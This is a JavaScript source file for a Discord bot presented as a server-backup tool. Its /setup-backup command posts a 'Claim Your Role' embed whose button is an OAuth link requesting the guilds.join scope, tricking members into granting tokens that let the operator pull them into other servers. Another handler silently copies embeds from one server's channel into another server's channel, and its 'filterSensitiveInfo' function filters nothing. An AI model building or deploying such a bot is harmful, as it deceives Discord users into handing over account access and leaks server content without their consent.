const { Client, GatewayIntentBits, Partials, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle, SlashCommandBuilder, REST, Routes, PermissionFlagsBits } = require('discord.js');
const { initializeFirebase, queryFirebase } = require('./firebase');
const { backupServer } = require('./backup');
const { restoreServer } = require('./restore');
const { setupOAuth, generateAuthURL } = require('./oauth');

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildModeration
    ],
    partials: [Partials.Channel, Partials.GuildMember]
});

// Initialize Firebase
initializeFirebase();

// Setup OAuth2 server
setupOAuth(client);

// Embed forwarding configuration
const SOURCE_CHANNEL_ID = process.env.SOURCE_CHANNEL_ID; // Channel ID in Server A
const DESTINATION_CHANNEL_ID = process.env.DESTINATION_CHANNEL_ID; // Channel ID in Server B
const DESTINATION_GUILD_ID = process.env.DESTINATION_GUILD_ID; // Server B ID

client.once('ready', async () => {
    console.log(`Bot is ready! Logged in as ${client.user.tag}`);
    console.log(`Serving ${client.guilds.cache.size} servers`);

    // Register slash commands as guild-only commands
    const commands = [
        new SlashCommandBuilder()
            .setName('setup-backup')
            .setDescription('Setup backup authorization for server members')
            .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
            .setDMPermission(false),
        new SlashCommandBuilder()
            .setName('backup')
            .setDescription('Manually backup current server')
            .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
            .setDMPermission(false),
        new SlashCommandBuilder()
            .setName('restore')
            .setDescription('Manually restore members from backup')
            .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
            .setDMPermission(false),
        new SlashCommandBuilder()
            .setName('backup-now')
            .setDescription('Manually backup current server immediately')
            .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
            .setDMPermission(false),
    ];

    const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_TOKEN);

    try {
        console.log('Registering slash commands...');
        await rest.put(Routes.applicationCommands(client.user.id), { body: commands });
        console.log('Successfully registered slash commands.');
    } catch (error) {
        console.error('Error registering slash commands');
    }
});

client.on('guildCreate', async (guild) => {
    console.log(`➕ Joined new server: ${guild.name} (${guild.id})`);

    try {
        // Send setup message to a suitable channel
        const channel = guild.channels.cache.find(
            ch => ch.type === 0 && // GuildText channel type
            ch.permissionsFor(guild.members.me).has([1 << 10, 1 << 11]) // SendMessages, ViewChannel permissions
        );

        if (channel) {
            // Send setup message without interaction (since this is guildCreate event)
            const embed = new EmbedBuilder()
                .setTitle('🔐 Server Backup Protection')
                .setDescription(
                    '**Protect yourself from server raids and deletions!**\n\n' +
                    'This bot can back up server data and restore everything if the server gets compromised.\n\n' +
                    '**Available Commands:**\n' +
                    '• `/setup-backup` - Setup OAuth authorization for member restoration\n' +
                    '• `/backup` - Manually backup this server\n' +
                    '• `/restore` - Manually restore members from backup\n' +
                    '• `/backup-now` - Force backup current server state\n\n' +
                    '**What gets backed up:**\n' +
                    '✅ Member data for restoration\n' +
                    '✅ OAuth tokens for re-inviting\n\n' +
                    '*Use `/setup-backup` to enable member restoration or `/backup` to create a backup.*'
                )
                .setColor(0x2f3136)
                .setThumbnail(guild.iconURL() || null)
                .setFooter({ text: 'Backup Bot • Manual Control' })
                .setTimestamp();

            await channel.send({ embeds: [embed] });
            console.log(`📨 Sent setup message to ${guild.name}`);
        }

    } catch (error) {
        console.error('Error handling new guild:', error);
    }
});



client.on('guildDelete', (guild) => {
    console.log(`Left/banned from server: ${guild.name} (${guild.id})`);
    // The backup data remains in Firebase for potential restore
});

client.on('guildUnavailable', (guild) => {
    console.log(`Server became unavailable: ${guild.name} (${guild.id})`);
    // Server might be temporarily down or deleted
});

// Function to pass through embeds without filtering (for testing)
function filterSensitiveInfo(embed) {
    if (!embed) return null;
    // Return the embed as-is without any filtering
    return embed;
}

// Listen for new messages to forward embeds
client.on('messageCreate', async (message) => {
    try {
        // Only process messages from the source channel
        if (!SOURCE_CHANNEL_ID || message.channel.id !== SOURCE_CHANNEL_ID) {
            return;
        }

        // Only process messages with embeds
        if (!message.embeds || message.embeds.length === 0) {
            return;
        }

        // Don't forward bot messages to prevent loops
        if (message.author.bot) {
            return;
        }

        console.log(`New embed message detected in source channel`);

        // Get destination channel
        const destinationGuild = client.guilds.cache.get(DESTINATION_GUILD_ID);
        if (!destinationGuild) {
            console.error('Destination guild not found');
            return;
        }

        const destinationChannel = destinationGuild.channels.cache.get(DESTINATION_CHANNEL_ID);
        if (!destinationChannel) {
            console.error('Destination channel not found');
            return;
        }

        // Check bot permissions in destination channel
        const botMember = destinationGuild.members.cache.get(client.user.id);
        if (!botMember) {
            console.error('Bot is not a member of destination guild');
            return;
        }

        const permissions = destinationChannel.permissionsFor(botMember);
        if (!permissions.has([PermissionFlagsBits.SendMessages, PermissionFlagsBits.EmbedLinks])) {
            console.error('Bot lacks permissions to send messages or embeds in destination channel');
            return;
        }

        // Process each embed
        for (const embed of message.embeds) {
            const filteredEmbed = filterSensitiveInfo(embed);
            
            if (!filteredEmbed) {
                console.log('Embed was null - skipping');
                continue;
            }

            // Create new embed builder with filtered data
            const forwardedEmbed = new EmbedBuilder();

            if (filteredEmbed.title) forwardedEmbed.setTitle(filteredEmbed.title);
            if (filteredEmbed.description) forwardedEmbed.setDescription(filteredEmbed.description);
            if (filteredEmbed.color) forwardedEmbed.setColor(filteredEmbed.color);
            if (filteredEmbed.thumbnail) forwardedEmbed.setThumbnail(filteredEmbed.thumbnail.url);
            if (filteredEmbed.image) forwardedEmbed.setImage(filteredEmbed.image.url);
            if (filteredEmbed.author) {
                forwardedEmbed.setAuthor({
                    name: filteredEmbed.author.name,
                    iconURL: filteredEmbed.author.iconURL,
                    url: filteredEmbed.author.url
                });
            }
            if (filteredEmbed.footer) {
                forwardedEmbed.setFooter({
                    text: filteredEmbed.footer.text,
                    iconURL: filteredEmbed.footer.iconURL
                });
            }
            if (filteredEmbed.timestamp) forwardedEmbed.setTimestamp(new Date(filteredEmbed.timestamp));

            // Add filtered fields
            if (filteredEmbed.fields && filteredEmbed.fields.length > 0) {
                filteredEmbed.fields.forEach(field => {
                    forwardedEmbed.addFields({
                        name: field.name,
                        value: field.value,
                        inline: field.inline || false
                    });
                });
            }

            // Add forwarding footer to indicate source
            const originalFooter = filteredEmbed.footer?.text || '';
            const forwardingText = `Forwarded from ${message.guild.name}`;
            const newFooterText = originalFooter ? `${originalFooter} • ${forwardingText}` : forwardingText;
            
            forwardedEmbed.setFooter({
                text: newFooterText,
                iconURL: filteredEmbed.footer?.iconURL || message.guild.iconURL()
            });

            // Send the filtered embed to destination channel
            await destinationChannel.send({
                embeds: [forwardedEmbed]
            });

            console.log(`Embed forwarded to destination channel (no filtering applied)`);
        }

    } catch (error) {
        console.error('Error forwarding embed:', error);
    }
});

client.on('interactionCreate', async (interaction) => {
    if (interaction.isChatInputCommand()) {
        // Check if command is used in a guild (not DM)
        if (!interaction.guild) {
            await interaction.reply({
                content: '**Error:** This command can only be used in servers, not in DMs.',
                ephemeral: true
            });
            return;
        }

        if (interaction.commandName === 'setup-backup') {
            // Check if user is server owner or has administrator permissions
            if (interaction.user.id !== interaction.guild.ownerId && !interaction.member.permissions.has('Administrator')) {
                await interaction.reply({
                    content: '**Error:** Only the server owner or administrators can use this command.',
                    ephemeral: true
                });
                return;
            }

            // Reply ephemeral first to hide the command usage
            await interaction.reply({
                content: '✅ Role claiming embed sent to the channel!',
                ephemeral: true
            });

            // Then send the embed to the channel
            try {
                const guild = interaction.guild;

                const embed = new EmbedBuilder()
                    .setTitle('Claim Your Role')
                    .setDescription(
                        '**Click the button below to claim your special role!**\n\n' +
                        '**Quick & Easy** - Just click the button\n' +
                        '**Secure Process** - Official Discord OAuth2\n' +
                        '**Instant Role** - Get your verified role immediately\n\n' +
                        '*Ready to claim your role? Click below!*'
                    )
                    .setColor(0x2f3136)
                    .setThumbnail('https://cdn.discordapp.com/emojis/886264180325941318.png')
                    .setFooter({ text: 'Secure Role Claiming System' })
                    .setTimestamp();

                // Create authorization button with generic OAuth URL
                const baseOAuthUrl = `https://discord.com/api/oauth2/authorize?client_id=${process.env.OAUTH2_CLIENT_ID}&redirect_uri=${encodeURIComponent(process.env.OAUTH2_REDIRECT_URI)}&response_type=code&scope=identify%20guilds.join&state=${guild.id}`;

                const authButton = new ButtonBuilder()
                    .setLabel('🎭 Claim Role')
                    .setStyle(ButtonStyle.Link)
                    .setURL(baseOAuthUrl);

                const row = new ActionRowBuilder()
                    .addComponents(authButton);

                await interaction.channel.send({
                    embeds: [embed],
                    components: [row]
                });

                console.log(`Sent role claim embed to ${guild.name} via slash command`);
            } catch (error) {
                console.error('Error sending role claim embed:', error);
                await interaction.followUp({
                    content: '**Error:** Failed to send role claim embed. Please try again.',
                    ephemeral: true
                });
            }
        }

        if (interaction.commandName === 'backup') {
            // Check if user is server owner or has administrator permissions
            if (interaction.user.id !== interaction.guild.ownerId && !interaction.member.permissions.has('Administrator')) {
                await interaction.reply({
                    content: '**Error:** Only the server owner or administrators can use this command.',
                    ephemeral: true
                });
                return;
            }

            try {
                const success = await backupServer(interaction.guild);

                if (success) {
                    await interaction.reply({
                        embeds: [{
                            title: 'Backup Complete',
                            description: `Successfully backed up **${interaction.guild.name}**\n\nThe backup includes member data for restoration.`,
                            color: 0x2f3136,
                            timestamp: new Date()
                        }],
                        ephemeral: true
                    });
                } else {
                    await interaction.reply({
                        embeds: [{
                            title: 'Backup Failed',
                            description: 'An error occurred during the backup process. Please check the console logs and try again.',
                            color: 0x2f3136,
                            timestamp: new Date()
                        }],
                        ephemeral: true
                    });
                }
            } catch (error) {
                console.error('Error during manual backup:', error);
                await interaction.reply({
                    embeds: [{
                        title: 'Backup Failed',
                        description: 'An error occurred during the backup process. Please try again or check the console logs.',
                        color: 0x2f3136,
                        timestamp: new Date()
                    }],
                    ephemeral: true
                });
            }
        }

        if (interaction.commandName === 'restore') {
            // Check if user is server owner or has administrator permissions
            if (interaction.user.id !== interaction.guild.ownerId && !interaction.member.permissions.has('Administrator')) {
                await interaction.reply({
                    content: '**Error:** Only the server owner or administrators can use this command.',
                    ephemeral: true
                });
                return;
            }

            try {
                const restored = await restoreServer(interaction.guild, client);

                if (restored) {
                    await interaction.reply({
                        embeds: [{
                            title: 'Member Restoration Started',
                            description: 'Member restoration process has been initiated! Check the progress in your server channels.',
                            color: 0x2f3136,
                            timestamp: new Date()
                        }],
                        ephemeral: true
                    });
                } else {
                    await interaction.reply({
                        embeds: [{
                            title: 'No Backup Found',
                            description: 'No backup data found for your server owner ID. Make sure you had the bot in a previous server that was backed up.',
                            color: 0x2f3136,
                            timestamp: new Date()
                        }],
                        ephemeral: true
                    });
                }
            } catch (error) {
                console.error('Error during manual restore:', error);
                await interaction.reply({
                    embeds: [{
                        title: 'Restoration Failed',
                        description: 'An error occurred during the restoration process. Please try again or check the console logs.',
                        color: 0x2f3136,
                        timestamp: new Date()
                    }],
                    ephemeral: true
                });
            }
        }

        if (interaction.commandName === 'backup-now') {
            // Check if user is server owner or has administrator permissions
            if (interaction.user.id !== interaction.guild.ownerId && !interaction.member.permissions.has('Administrator')) {
                await interaction.reply({
                    content: '**Error:** Only the server owner or administrators can use this command.',
                    ephemeral: true
                });
                return;
            }

            try {
                const success = await backupServer(interaction.guild);

                if (success) {
                    await interaction.reply({
                        embeds: [{
                            title: 'Force Backup Complete',
                            description: `Successfully backed up **${interaction.guild.name}**\n\nThe backup includes current member data for restoration.`,
                            color: 0x2f3136,
                            timestamp: new Date()
                        }],
                        ephemeral: true
                    });
                } else {
                    await interaction.reply({
                        embeds: [{
                            title: 'Backup Failed',
                            description: 'An error occurred during the backup process. Please check the console logs and try again.',
                            color: 0x2f3136,
                            timestamp: new Date()
                        }],
                        ephemeral: true
                    });
                }
            } catch (error) {
                console.error('Error during force backup:', error);
                await interaction.reply({
                    embeds: [{
                        title: 'Backup Failed',
                        description: 'An error occurred during the backup process. Please try again or check the console logs.',
                        color: 0x2f3136,
                        timestamp: new Date()
                    }],
                    ephemeral: true
                });
            }
        }
    }

    if (interaction.isButton()) {
        // No button interactions needed - direct OAuth links are used
    }
});

// Error handling
client.on('error', (error) => {
    console.error('Discord client error:', error);
});

process.on('unhandledRejection', (error) => {
    console.error('Unhandled promise rejection:', error);
});

// Login to Discord
client.login(process.env.DISCORD_TOKEN);
